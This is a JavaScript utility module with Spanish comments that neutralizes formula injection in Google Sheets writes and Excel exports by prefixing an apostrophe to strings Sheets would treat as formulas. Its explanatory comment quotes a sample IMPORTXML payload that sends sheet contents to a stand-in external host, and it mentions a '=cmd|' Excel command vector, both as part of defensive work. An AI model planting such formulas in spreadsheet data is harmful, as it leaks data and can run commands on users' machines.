// Neutraliza el texto que Google Sheets y Excel interpretarían como fórmula.
// Isomorfo y sin dependencias, como el resto de lib/domain/.
//
// POR QUÉ EXISTE. Las escrituras van con USER_ENTERED (ver MODO_ESCRITURA en
// lib/google/sheets-api.js): Google interpreta el string como si una persona lo
// hubiera tipeado, que es lo que imita a `setValues()` del Apps Script y lo que
// hace que "31-07-26" quede fecha y "20.440" quede número. El precio de ese modo
// es que un texto que empieza con = + - @ se guarda como fórmula EJECUTABLE.
//
// En Sheets eso es peor que en Excel, porque hay funciones con acceso a red:
//
//   =IMPORTXML("https://ajeno.example/?f="&TEXTJOIN(",",1,A1:Z100), "//a")
//
// escrito como nombre de sucursal, Google lo evalúa del lado de sus servidores y
// manda el contenido de la planilla afuera, sin que nadie abra nada. El mismo
// texto viaja después al Excel exportado (lib/reportes/medidores-excel.js),
// donde `=cmd|…` es ejecución de comandos en el PC de quien lo abra.

/**
 * Lo que USER_ENTERED tiene que seguir interpretando: números y fechas escritos
 * como texto ("-5", "+1.234,56", "20.440", "31-07-26").
 *
 * Sin esta excepción, "-5" se guardaría como texto y dejaría de ser un número
 * negativo al leerlo de vuelta — que es exactamente la clase de corrupción
 * silenciosa que MODO_ESCRITURA está evitando.
 */
const NUMERO_O_FECHA = /^[+-]?\d[\d.,:/\s-]*$/;

/**
 * Prefija con apóstrofo lo que Sheets tomaría por fórmula. El apóstrofo inicial
 * es la forma canónica de Sheets de decir "esto es texto": no se muestra en la
 * celda y no aparece al leer el valor de vuelta.
 */
export function neutralizarFormula(v) {
  if (typeof v !== "string") return v; // números, fechas y null pasan intactos
  if (!/^[=+\-@\t\r]/.test(v)) return v;
  if (NUMERO_O_FECHA.test(v)) return v;
  return "'" + v;
}

/** `neutralizarFormula` sobre una matriz de filas. */
export function sanearFilas(filas) {
  return (filas || []).map((f) => (f || []).map(neutralizarFormula));
}
